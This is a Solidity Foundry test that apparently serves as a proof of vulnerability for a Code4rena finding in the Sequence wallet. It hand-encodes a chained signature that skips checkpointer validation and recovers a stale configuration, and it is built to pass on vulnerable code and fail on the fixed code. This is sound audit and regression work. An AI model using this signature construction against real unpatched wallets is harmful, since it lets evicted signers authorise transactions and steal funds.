// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.27;

import { Test } from "forge-std/Test.sol";

import { Payload } from "src/modules/Payload.sol";
import { BaseAuth } from "src/modules/auth/BaseAuth.sol";

/// @notice Minimal concrete auth wallet.
/// `recoverPartialSignature` (from IPartialAuth) is the stable public entry point
/// that runs the signature-recovery path under test. It compiles against both the
/// vulnerable and the fixed BaseSig, because the only argument that changed between
/// them lives inside the repository's own `BaseAuth` -> `BaseSig.recover` call, not
/// in this test file.
contract AuthHarness is BaseAuth {

  function _isValidImage(
    bytes32
  ) internal view override returns (bool) {
    return true;
  }

  function _updateImageHash(
    bytes32
  ) internal override { }

}

/// @title PoV for Code4rena 2025-10-sequence H-01 (finding 63760)
/// @notice "Chained signature with checkpoint usage disabled can bypass all
///         checkpointer validation". Adapted from the report's
///         `test_PoC_checkpointer_bypass`, but hand-encoding the config image hash
///         and the signature so the test needs no external primitives RPC server
///         and runs fully offline.
///
/// Oracle: this test PASSES on the vulnerable code (the chained signature is
/// accepted and recovers the stale config1 image hash, so the checkpointer is
/// ignored) and FAILS on the fixed code (recovery no longer reproduces config1,
/// because the inner signature can no longer smuggle in a disabled checkpointer).
contract PoV63760_Sequence is Test {

  AuthHarness internal harness;

  function setUp() public {
    harness = new AuthHarness();
  }

  // BaseSig._leafForAddressAndWeight
  function _leaf(address addr, uint256 weight) internal pure returns (bytes32) {
    return keccak256(abi.encodePacked("Sequence signer:\n", addr, weight));
  }

  // LibOptim.fkeccak256: keccak256 of two tightly packed 32-byte words
  function _fk(bytes32 a, bytes32 b) internal pure returns (bytes32 c) {
    assembly {
      mstore(0, a)
      mstore(32, b)
      c := keccak256(0, 64)
    }
  }

  function test_PoC_checkpointer_bypass() external {
    (address alice, uint256 aliceKey) = makeAddrAndKey("alice");

    address checkpointer = address(0xBEEF);
    uint256 checkpoint1 = 1;
    uint256 threshold1 = 1;
    uint256 weight1 = 1;

    // config1 is the stale configuration the wallet is still at: Alice is the only
    // signer (weight 1), threshold 1, checkpoint 1, behind checkpointer 0xBEEF.
    // Its image hash is built exactly as BaseSig.recover builds it.
    bytes32 config1Hash = _leaf(alice, weight1);
    config1Hash = _fk(config1Hash, bytes32(threshold1));
    config1Hash = _fk(config1Hash, bytes32(checkpoint1));
    config1Hash = _fk(config1Hash, bytes32(uint256(uint160(checkpointer))));

    // The payload the (evicted) signer wants to authorise.
    Payload.Decoded memory finalPayload;
    finalPayload.kind = Payload.KIND_TRANSACTIONS;

    bytes32 opHash = Payload.hashFor(finalPayload, address(harness));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(aliceKey, opHash);

    // Inner (non-chained) signature valid for config1, with the checkpointer bit
    // set and the checkpointer address embedded, but without the 3-byte
    // checkpointer-data block (so no snapshot is read).
    bytes memory inner = _innerSig(checkpointer, checkpoint1, threshold1, weight1, r, s, v);

    // Outer chained wrapper. Outer flag 0x05 = signature type 01 (chained) with the
    // checkpointer bit (0x40) left unset. A single inner signature follows, length
    // prefixed with 3 bytes.
    bytes memory chained = abi.encodePacked(bytes1(0x05), bytes3(uint24(inner.length)), inner);

    (uint256 threshold, uint256 weight,, bytes32 imageHash,,) =
      harness.recoverPartialSignature(finalPayload, chained);

    assertGe(weight, threshold, "Weight must at least reach threshold");
    assertEq(imageHash, config1Hash, "Must recover the stale config1 image hash");
  }

  function _innerSig(
    address checkpointer,
    uint256 checkpoint,
    uint256 threshold,
    uint256 weight,
    bytes32 r,
    bytes32 s,
    uint8 v
  ) internal pure returns (bytes memory) {
    // flag 0x44: bit 6 (0x40) checkpointer used, checkpoint size = 1 byte (0x04),
    // type 00 (normal), threshold size = 1 byte.
    bytes1 flag = bytes1(0x44);

    // ERC-2098 compact signature: r, then yParity packed into the top bit of s.
    uint256 yParity = uint256(v) - 27;
    bytes32 yParityAndS = bytes32((yParity << 255) | uint256(s));

    // Branch: FLAG_SIGNATURE_HASH (top nibble 0) with the weight in the low nibble.
    bytes1 branchFlag = bytes1(uint8(weight));

    return abi.encodePacked(
      flag,
      bytes20(checkpointer),
      bytes1(uint8(checkpoint)),
      bytes1(uint8(threshold)),
      branchFlag,
      r,
      yParityAndS
    );
  }

}
